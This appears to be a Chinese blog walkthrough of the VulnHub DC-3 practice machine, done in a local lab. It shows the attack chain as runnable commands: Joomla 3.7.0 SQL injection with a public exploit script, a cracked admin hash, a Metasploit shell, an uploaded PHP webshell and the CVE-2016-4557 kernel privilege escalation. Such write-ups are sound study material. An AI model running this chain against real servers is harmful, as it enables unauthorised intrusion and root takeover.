---
cover: /images/VulnHub.jpg
title: VulnHub DC-3 靶机渗透测试笔记
categories:
  - vulnhub-DC
tags:
  - 靶机渗透
  - VulnHub
  - vulnhub-DC
  - Joomla
  - 提权
abbrlink: b169bdb4
date: 2026-03-12 12:00:00# VulnHub DC-3 靶机渗透测试笔记

> **靶机信息**
>
> - 靶机名称：DC-3
> - 靶机来源：VulnHub
> - 目标：获取 root 权限，找到最终 flag
> - 难度：⭐⭐⭐☆☆（中等）
> - 涉及技术：信息收集、Joomla 漏洞利用、SQL注入、Webshell上传、Linux内核提权
> - https://www.cnblogs.com/wrold/p/19679157

---

## 一、信息收集

### 1.1 主机发现

查看本机网段，确认目标网段：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image1.png)

使用 nmap 扫描存活主机：

```bash
nmap -sn 192.168.168.0/24
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image2.png)

扫描结果：
- `192.168.168.1` → VM8 网卡
- `192.168.168.2` → 网关
- `192.168.168.128` → Kali 本机
- `192.168.168.129` → **靶机 DC-3**
- `192.168.168.254` → DHCP 服务器

### 1.2 端口与服务扫描

对目标进行全端口详细扫描：

```bash
nmap -A -p- 192.168.168.129
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image3.png)

> DC-3 只开放了 80 端口，攻击面集中在 Web 应用。

### 1.3 Web 信息收集

浏览器访问目标网站：

```
http://192.168.168.129/
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image4.png)

使用 Wappalyzer 识别 CMS 类型：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image5.png)

确认为 **Joomla CMS**，接下来针对 Joomla 进行专项扫描。

### 1.4 目录扫描

使用 dirsearch 扫描目录，找到后台入口：

```bash
dirsearch -u http://192.168.168.129/
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image6.png)

发现后台登录页面：

```
http://192.168.168.129/administrator/
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image7.png)

---

## 二、漏洞扫描

### 2.1 使用 JoomScan 识别版本

搜索 Joomla 专用漏洞扫描工具 JoomScan：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image8.png)

安装并使用：

```bash
sudo apt install joomscan
joomscan -u 192.168.168.129
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image9.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image10.png)

确认 Joomla 版本为 **3.7.0**：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image11.png)

### 2.2 搜索 Joomla 3.7.0 漏洞

搜索该版本已知漏洞：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image12.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260306135733891.png)

确认存在漏洞，在 MSF 中搜索：

```bash
search joomla 3.7
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image14.png)

---

## 三、漏洞利用

### 3.1 MSF 利用（失败）

尝试使用 MSF 模块直接利用：

```bash
use exploit/unix/webapp/joomla_comfields_sqli_rce
show options
set RHOSTS 192.168.168.129
run
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image15.png)

报错：

```
No logged-in Administrator or Super User user found!
Exploit completed, but no session was created.
```

> 提示需要管理员权限才能利用，需要先获取后台账号。

### 3.2 SQL 注入获取管理员密码

使用 searchsploit 找到 SQL 注入利用脚本：

```bash
searchsploit joomla 3.7
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image16.png)

找到并查看利用脚本：

```bash
find / -name 44227.php
cat /usr/share/exploitdb/exploits/php/remote/44227.php
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image17.png)

启动 PHP 内置服务器运行该脚本：

```bash
php -S 0.0.0.0:8888
# 若报错先安装依赖
apt install php-curl -y
```

（通过网站访问）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image18.png)

输入目标 IP 执行攻击，获取到数据库信息：

| 字段 | 值 |
|------|-----|
| Database user | root@localhost |
| Database name | joomladb |
| Database version | 5.7.25-0ubuntu0.16.0 |
| Username | admin |
| Email | freddy@norealaddress |
| Password hash | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |

将 hash 去在线工具破解，得到明文密码：

```
snoopy
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image19.png)

> 如在线工具解不出，也可以用 john 或 hashcat 配合字典爆破。

### 3.3 登录后台

使用获取到的账号登录 Joomla 后台：

```
http://192.168.168.129/administrator/
账号：admin
密码：snoopy
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image20.png)

登录成功后，回到 MSF 重新执行攻击，这次成功获取 shell：

```bash
use exploit/unix/webapp/joomla_comfields_sqli_rce
set RHOSTS 192.168.168.129
run
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image21.png)

> **漏洞原理说明：**
> - SQL 注入脚本利用 Joomla 3.7.0 的 `com_fields` 组件存在注入点，直接拖库
> - MSF 模块利用的是 Joomla 后台模板编辑功能写入 Webshell，需要管理员权限

---

## 四、后渗透与提权

### 4.1 查看当前权限

获取 shell 后确认当前用户权限：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image22.png)

当前为 **www-data** 权限，需要提权。

### 4.2 上传 Webshell

（为了用哥斯拉，也可以不用）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image23.png)

通过 MSF 上传 PHP Webshell 到 Web 目录：

```bash
upload '/home/kali/桌面/shell.php' /var/www/html/templates/beez3
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image24.png)

浏览器访问确认 Webshell 正常运行：

```
http://192.168.168.129/templates/beez3/shell.php
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image25.png)

### 4.3 使用 Linux Exploit Suggester 枚举提权方向

下载提权辅助工具：

可以直接在靶机上下载

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image26.png)

升级为交互式终端并执行：

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
chmod 777 les.sh
./les.sh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image27.png)

工具推荐了多个可用的内核提权漏洞，选择使用 **CVE-2016-4557（eBPF 双重释放漏洞）**，（比脏牛更稳定。因为脏牛的一个exp失败了，就中间这个，靶机崩了，下面的就是脏牛的，先编译，后续不写了，靶机崩了3次）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image29.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image30.png)

注：直接用脏牛（40611.c）时靶机容易崩溃，因此换用了更稳定的 eBPF 利用方式。

### 4.4 内核提权（CVE-2016-4557）

kali搜索漏洞

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image31.png)

txt里面提供了exp的下载链接

下载 exp 并通过 Webshell（哥斯拉）上传到靶机：

图片给错了，上传的是exploit.tar这个exp

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image28.png)

解压并编译执行：

```bash
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image34.png)

### 4.5 获取 root 权限

成功提权到 root，获取最终 flag：

```bash
whoami
cd /root
ls
cat the-flag.txt
```



![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image35.png)

---

## 五、渗透流程总结

```
信息收集（nmap + dirsearch）
    ↓
发现 Joomla 3.7.0 → JoomScan 确认版本
    ↓
SQL注入（44227.php）→ 获取管理员 hash → 破解得到 snoopy
    ↓
登录后台 → MSF 写入 Webshell → 获取 www-data shell
    ↓
上传 les.sh 枚举提权漏洞
    ↓
CVE-2016-4557 eBPF 内核提权 → root → flag ✅
```

---

## 六、涉及工具汇总

| 工具 | 用途 |
|------|------|
| nmap | 端口扫描、服务识别 |
| dirsearch | Web 目录扫描 |
| Wappalyzer | CMS 识别 |
| JoomScan | Joomla 专项扫描 |
| searchsploit | 本地漏洞库搜索 |
| Metasploit | 漏洞利用框架 |
| 44227.php | Joomla SQL注入利用 |
| linux-exploit-suggester | Linux 提权辅助枚举 |
| 哥斯拉 | Webshell 管理工具 |

---

> 本文为 VulnHub DC-3 靶机学习笔记，所有操作均在本地搭建的靶场环境中完成，仅用于学习交流。
